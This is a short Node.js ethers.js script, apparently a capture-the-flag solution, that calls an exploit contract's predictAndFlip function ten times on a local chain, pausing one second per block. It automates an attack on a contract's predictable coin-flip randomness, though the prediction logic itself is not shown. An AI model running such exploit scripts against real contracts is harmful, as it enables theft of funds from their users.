const { ethers } = require("ethers");
require('dotenv').config();

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

async function exploit() {
    const provider = new ethers.JsonRpcProvider(process.env.RPC_LOCAL);
    const wallet = new ethers.Wallet(process.env.PK, provider);

    const exploitContract = new ethers.Contract(
        process.env.PLAYER_ADDRESS,
        ["function predictAndFlip() public"],
        wallet
    );

    for (let i = 0; i < 10; i++) {
        const tx = await exploitContract.predictAndFlip();
        await tx.wait();

        console.log(`Transaction ${i + 1} confirmed.`);
        await sleep(1000); // Wait for 1 second because the network mines a new block each second.
    }
}

exploit().catch(console.error);
